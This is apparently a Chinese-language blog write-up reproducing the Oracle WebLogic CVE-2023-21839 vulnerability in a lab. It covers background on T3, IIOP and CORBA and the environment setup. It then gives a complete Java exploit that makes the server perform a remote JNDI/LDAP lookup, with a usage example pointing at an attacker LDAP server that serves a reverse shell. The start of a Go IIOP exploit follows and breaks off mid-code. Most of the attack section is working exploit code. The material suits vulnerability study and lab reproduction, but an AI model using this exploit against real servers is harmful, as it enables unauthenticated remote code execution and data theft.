<th>12.2.1.3.0 12.2.1.4.0 14.1.1.0.0</th>
</tr>
</thead>
<tbody><tr>
<td align="left">CVE-id</td>
<td>产品</td>
<td>元件</td>
<td>协议</td>
<td>无需身份验证即可远程利用。</td>
<td>评分</td>
<td>攻击向量</td>
<td>攻复合体</td>
<td>Privs’Req[权限提提升]</td>
<td>用户交互</td>
<td>范围</td>
<td>倾诉</td>
<td>内涵</td>
<td>可用性</td>
<td>版本</td>
</tr>
</tbody></table>
<h3 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h3><h4 id="weblogic是什么？"><a href="#weblogic是什么？" class="headerlink" title="weblogic是什么？"></a>weblogic是什么？</h4><blockquote>
<p>WebLogic是<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E7%BE%8E%E5%9B%BDOracle%E5%85%AC%E5%8F%B8/9952086?fromModule=lemma_inlink">美国Oracle公司</a>出品的一个application server，确切的说是一个基于<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/JAVAEE/3066623?fromModule=lemma_inlink">JAVAEE</a>架构的<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E4%B8%AD%E9%97%B4%E4%BB%B6/452240?fromModule=lemma_inlink">中间件</a>，WebLogic是用于开发、集成、部署和管理大型分布式Web应用、<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E7%BD%91%E7%BB%9C%E5%BA%94%E7%94%A8/2196523?fromModule=lemma_inlink">网络应用</a>和<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%BA%94%E7%94%A8/10563731?fromModule=lemma_inlink">数据库应用</a>的<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/Java/85979?fromModule=lemma_inlink">Java</a>应用服务器。将Java的动态功能和Java Enterprise标准的安全性引入大型网络应用的开发、集成、部署和管理之中。</p>
</blockquote>
<h4 id="T3的概念和交互过程"><a href="#T3的概念和交互过程" class="headerlink" title="T3的概念和交互过程"></a>T3的概念和交互过程</h4><blockquote>
<p>T3也称为丰富套接字，是BEA内部协议，功能丰富，可扩展性好。T3是多工双向和异步协议，经过高度优化，只使用一个套接字和一条线程。借助这种方法，基于Java的客户端可以根据服务器方需求使用多种<code>RMI</code>对象，但仍使用一个套接字和一条线程。这也为我们静态分析t3协议带来了很多麻烦</p>
<p>RMI在log4j中提到，它是一个调用远程类的一个Java的方法</p>
</blockquote>
<p><strong>交互方式</strong></p>
<p><a data-fancybox="gallery" data-src="/CVE-Test/image-20230226152124965.png"><img src="/CVE-Test/image-20230226152124965.png" alt="image-20230226152124965"></a></p>
<h4 id="iiop概念"><a href="#iiop概念" class="headerlink" title="iiop概念"></a>iiop概念</h4><blockquote>
<p>用来在CORBA<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E5%AF%B9%E8%B1%A1%E8%AF%B7%E6%B1%82%E4%BB%A3%E7%90%86?fromModule=lemma_inlink">对象请求代理</a>之间交流的协议。Java中使得程序可以和其他语言的CORBA实现<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E4%BA%92%E6%93%8D%E4%BD%9C%E6%80%A7?fromModule=lemma_inlink">互操作性</a>的协议。</p>
<p>这个协议的最初阶段是要建立以下几个组件部分：一个IIOP到HTTP的<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E7%BD%91%E5%85%B3?fromModule=lemma_inlink">网关</a>，使用这个网关可以让CORBA客户访问WWW资源；一个HTTP到IIOP的网关，通过这个网关可以访问CORBA资源；一个为IIOP和HTTP提供资源的服务器，一个能够将IIOP作为可识别协议的浏览器。</p>
</blockquote>
<h4 id="什么是CORBA"><a href="#什么是CORBA" class="headerlink" title="什么是CORBA"></a>什么是CORBA</h4><blockquote>
<p>CORBA（Common ObjectRequest Broker Architecture公共对象请求代理体系结构）是由<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/OMG/3041465?fromModule=lemma_inlink">OMG</a>组织制订的一种标准的<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1/2262089?fromModule=lemma_inlink">面向对象</a>应用程序体系规范。或者说CORBA体系结构是对象管理组织（OMG）为解决<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E5%88%86%E5%B8%83%E5%BC%8F%E5%A4%84%E7%90%86/3352171?fromModule=lemma_inlink">分布式处理</a>环境(DCE)中，硬件和软件系统的互连而提出的一种解决方案；OMG组织是一个国际性的<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E9%9D%9E%E7%9B%88%E5%88%A9%E7%BB%84%E7%BB%87/5622954?fromModule=lemma_inlink">非盈利组织</a>，其职责是为<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E5%BA%94%E7%94%A8/3994271?fromModule=lemma_inlink">应用</a>开发提供一个公共框架，制订工业指南和对象管理规范，加快对象技术的发展。</p>
</blockquote>
<h3 id="环境搭建-1"><a href="#环境搭建-1" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>从官网下载<code>Weblogic 12.2.1.3.0</code></p>
<p><code>https://www.oracle.com/middleware/technologies/weblogic-server-installers-downloads.html</code></p>
<p><a data-fancybox="gallery" data-src="/CVE-Test/image-20230226141556869.png"><img src="/CVE-Test/image-20230226141556869.png" alt="image-20230226141556869"></a></p>
<p>然后解压其中的jar包，然后到<code>/disk1/install</code>下执行cmd脚本就行</p>
<p>但是需要注意，由于<code>Weblogic</code>中的<code>maven</code>的存在，其识别<code>jdk</code>时，只针对环境变量名<code>JAVA_HOME</code>的路径进行识别，而如果是在PATH中配置的，会报错找不到<code>java</code>环境的位置</p>
<figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ERROR: </span>Cannot determine the Java Home ERROR: Specify the -jreLoc option</span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/CVE-Test/image-20230226142921961.png"><img src="/CVE-Test/image-20230226142921961.png" alt="image-20230226142921961"></a></p>
<p>然后再次管理员执行时发现失败，查看报错日志</p>
<blockquote>
<p>java.lang.NullPointerException: Cannot invoke “java.lang.<strong><code>reflect.Method</code></strong>.invoke(Object, Object[])” because “com.sun.<code>xml.bind</code>.v2.runtime.reflect.opt.Injector.defineClass” <strong><code>is null</code></strong>[[</p>
</blockquote>
<p>猜测应该是我的<code>java</code>自身的问题</p>
<p>从<code>stack</code>中了解到了，在<code>java9</code>的时候，<code>JAXB</code>（Java Architecture for XML Binding）<code>[java映射为xml的表示方式]</code> </p>
<p>在<code>java9</code>已经被标记为弃用，在<code>java11</code>的时候已经被删除，所以需要换到低版本的<code>java</code>或者在依赖项添加<code>xml</code>库，让其重新映射</p>
<p><a target="_blank" rel="noopener" href="https://javaalmanac.io/jdk/11/apidiff/9/">New APIs in Java 11 - javaalmanac.io</a></p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.sun.xml.bind<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jaxb-impl<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.3.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.sun.xml.messaging.saaj<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>saaj-impl<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.5.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>【建议下载jdk8低版本最方便，记得再次修改JAVA_HOME环境变量】</p>
<blockquote>
<p>注意，这个和log4j的原因一样，是加载远程恶意类导致远程命令的执行，所以对java是否开启加载远程类，也就是要注意对应的版本</p>
<p>版本≤ <code>JDK 6u211、7u201、 8u191、11.0.1</code></p>
<p>所以我这里复现的环境和apache的log4j2一样，是<code>JDK-8u171</code>，配置方式如cve-2021-44228</p>
</blockquote>
<p>安装搭建按流程按引导</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost:7001/console</span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/CVE-Test/image-20230226165115723.png"><img src="/CVE-Test/image-20230226165115723.png" alt="image-20230226165115723"></a></p>
<h3 id="渗透流程"><a href="#渗透流程" class="headerlink" title="渗透流程"></a>渗透流程</h3><p>这是2023年一月的洞，我是二月复现的，目前大致就两种payload工具，一个<code>java</code>的，一个<code>go</code></p>
<p>仔细分析一下漏洞的利用条件和形成原因，以及两个工具的脚本的原理</p>
<blockquote>
<p>go的<a target="_blank" rel="noopener" href="https://github.com/4ra1n/CVE-2023-21839">4ra1n&#x2F;CVE-2023-21839: Weblogic CVE-2023-21839 RCE (无需Java依赖一键RCE) (github.com)</a></p>
<p>java的<a target="_blank" rel="noopener" href="https://github.com/DXask88MA/Weblogic-CVE-2023-21839">DXask88MA&#x2F;Weblogic-CVE-2023-21839 (github.com)</a></p>
</blockquote>
<p>两者大差不差，但是个人感觉go更舒服一些</p>
<blockquote>
<p>在公网上，IIOP协议和NAT转换之间存在冲突的网络问题，</p>
<p>一般只能修改源码或者尝试<strong>iiop协议net绕过</strong><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/8508">Weblogic IIOP 协议NAT 网络绕过 - 先知社区 (aliyun.com)</a></p>
<p>【冲突原因学习记在keynotes上，大致就是两者之间的ip指向和ip转换冲突，一个根据自身规则发送数据到私网ip，另一个根据自身规则把私网ip又变为公网ip，从而通讯连接失败】</p>
<p>用go进行重写iiop的一些协议，从而避免在对公网或者docker进行操作的时候出现连接网络错误，当然java也是可以修改iiop规则的，视情况和能力而定</p>
</blockquote>
<h4 id="远程代码执行原理"><a href="#远程代码执行原理" class="headerlink" title="远程代码执行原理"></a>远程代码执行原理</h4><blockquote>
<p>利用该漏洞允许未经身份验证的攻击者通过 <code>T3、IIOP</code> 进行网络访问，从而危害 Oracle WebLogic Server。成功攻击此漏洞可导致未经授权访问<code>关键数据或完全访问所有 Oracle WebLogic Server 可访问数据</code>。</p>
</blockquote>
<h4 id="JAVA"><a href="#JAVA" class="headerlink" title="JAVA"></a>JAVA</h4><p>（不好的就是需要对应java版本跑，每个版本Java都要删去一些东西，还是go整洁的包舒服）</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.naming.Context;</span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"><span class="keyword">import</span> javax.naming.NamingException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;</span><br><span class="line"><span class="keyword">import</span> java.util.Random;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CVE_2023_21839</span> &#123;</span><br><span class="line">    <span class="comment">// JNDI_FACTORY类，用于创建InitialContext</span></span><br><span class="line">    <span class="keyword">static</span> <span class="type">String</span> <span class="variable">JNDI_FACTORY</span> <span class="operator">=</span> <span class="string">&quot;weblogic.jndi.WLInitialContextFactory&quot;</span>;</span><br><span class="line">    <span class="comment">// 使用说明</span></span><br><span class="line">    <span class="keyword">static</span> <span class="type">String</span> <span class="variable">HOW_TO_USE</span> <span class="operator">=</span> <span class="string">&quot;[*]java -jar 目标ip:端口 ldap地址\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;e.g. java -jar 192.168.220.129:7001 ldap://192.168.31.58:1389/Basic/ReverseShell/192.168.220.129/1111&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取InitialContext对象</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> InitialContext <span class="title function_">getInitialContext</span><span class="params">(String url)</span> <span class="keyword">throws</span> NamingException &#123;</span><br><span class="line">        <span class="comment">// 设置JNDI环境参数</span></span><br><span class="line">        Hashtable&lt;String, String&gt; env = <span class="keyword">new</span> <span class="title class_">Hashtable</span>&lt;String, String&gt;();</span><br><span class="line">        env.put(Context.INITIAL_CONTEXT_FACTORY, JNDI_FACTORY);</span><br><span class="line">        env.put(Context.PROVIDER_URL, url);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>(env);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 主函数</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String args[])</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// 检查命令行参数是否足够</span></span><br><span class="line">        <span class="keyword">if</span> (args.length &lt; <span class="number">2</span>) &#123;</span><br><span class="line">            System.out.println(HOW_TO_USE);</span><br><span class="line">            System.exit(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 从命令行参数获取t3协议地址和LDAP地址</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">t3Url</span> <span class="operator">=</span> args[<span class="number">0</span>];</span><br><span class="line">        <span class="type">String</span> <span class="variable">ldapUrl</span> <span class="operator">=</span> args[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建t3协议的InitialContext</span></span><br><span class="line">        <span class="type">InitialContext</span> <span class="variable">c</span> <span class="operator">=</span> getInitialContext(<span class="string">&quot;t3://&quot;</span> + t3Url);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 设置新的JNDI环境参数</span></span><br><span class="line">        Hashtable&lt;String, String&gt; env = <span class="keyword">new</span> <span class="title class_">Hashtable</span>&lt;String, String&gt;();</span><br><span class="line">        env.put(Context.INITIAL_CONTEXT_FACTORY, <span class="string">&quot;com.sun.jndi.rmi.registry.RegistryContextFactory&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建ForeignOpaqueReference对象</span></span><br><span class="line">        weblogic.deployment.jms.<span class="type">ForeignOpaqueReference</span> <span class="variable">f</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">weblogic</span>.deployment.jms.ForeignOpaqueReference();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 使用反射获取并设置ForeignOpaqueReference的私有字段jndiEnvironment</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">jndiEnvironment</span> <span class="operator">=</span> weblogic.deployment.jms.ForeignOpaqueReference.class.getDeclaredField(<span class="string">&quot;jndiEnvironment&quot;</span>);</span><br><span class="line">        jndiEnvironment.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        jndiEnvironment.set(f, env);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 使用反射获取并设置ForeignOpaqueReference的私有字段remoteJNDIName</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">remoteJNDIName</span> <span class="operator">=</span> weblogic.deployment.jms.ForeignOpaqueReference.class.getDeclaredField(<span class="string">&quot;remoteJNDIName&quot;</span>);</span><br><span class="line">        remoteJNDIName.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        remoteJNDIName.set(f, ldapUrl);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 生成一个随机的绑定名</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">bindName</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Random</span>(System.currentTimeMillis()).nextLong() + <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 尝试绑定ForeignOpaqueReference对象到InitialContext</span></span><br><span class="line">            c.bind(bindName, f);</span><br><span class="line">            <span class="comment">// 尝试查找绑定的对象</span></span><br><span class="line">            c.lookup(bindName);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="comment">// 异常处理，可以根据实际情况修改</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="GO"><a href="#GO" class="headerlink" title="GO"></a>GO</h4><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;CVE-2023-21839&quot;</span></span><br><span class="line">	<span class="string">&quot;encoding/binary&quot;</span></span><br><span class="line">	<span class="string">&quot;encoding/hex&quot;</span></span><br><span class="line">	<span class="string">&quot;flag&quot;</span></span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">	<span class="string">&quot;net&quot;</span></span><br><span class="line">	<span class="string">&quot;strings&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> (</span><br><span class="line">	hostConfig <span class="type">string</span></span><br><span class="line">	portConfig <span class="type">int</span></span><br><span class="line">	ldapConfig <span class="type">string</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> (</span><br><span class="line">	key1    <span class="type">string</span></span><br><span class="line">	key2    <span class="type">string</span></span><br><span class="line">	key3    <span class="type">string</span></span><br><span class="line">	wlsKey1 <span class="type">string</span></span><br><span class="line">	wlsKey2 <span class="type">string</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> (</span><br><span class="line">	ServiceContext0 = &amp;giop.ServiceContext&#123;</span><br><span class="line">		VSCID:      giop.D(<span class="string">&quot;000000&quot;</span>),</span><br><span class="line">		SCID:       giop.D(<span class="string">&quot;05&quot;</span>),</span><br><span class="line">		Endianness: []<span class="type">byte</span>&#123;giop.BigEndianType&#125;,</span><br><span class="line">		Data:       giop.D(<span class="string">&quot;000000000000010000000d3137322e32362e3131322e310000ec5b&quot;</span>),</span><br><span class="line">	&#125;</span><br><span class="line">	ServiceContext1 = &amp;giop.ServiceContext&#123;</span><br><span class="line">		VSCID:      giop.D(<span class="string">&quot;000000&quot;</span>),</span><br><span class="line">		SCID:       giop.D(<span class="string">&quot;01&quot;</span>),</span><br><span class="line">		Endianness: []<span class="type">byte</span>&#123;giop.BigEndianType&#125;,</span><br><span class="line">		Data:       giop.D(<span class="string">&quot;0000000001002005010001&quot;</span>),</span><br><span class="line">	&#125;</span><br><span class="line">	ServiceContext2 = &amp;giop.ServiceContext&#123;</span><br><span class="line">		VSCID:      giop.D(<span class="string">&quot;424541&quot;</span>),</span><br><span class="line">		SCID:       giop.D(<span class="string">&quot;00&quot;</span>),</span><br><span class="line">		Endianness: []<span class="type">byte</span>&#123;giop.BigEndianType&#125;,</span><br><span class="line">		Data:       giop.D(<span class="string">&quot;0a0301&quot;</span>),</span><br><span class="line">	&#125;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	flag.StringVar(&amp;hostConfig, <span class="string">&quot;ip&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;ip&quot;</span>)</span><br><span class="line">	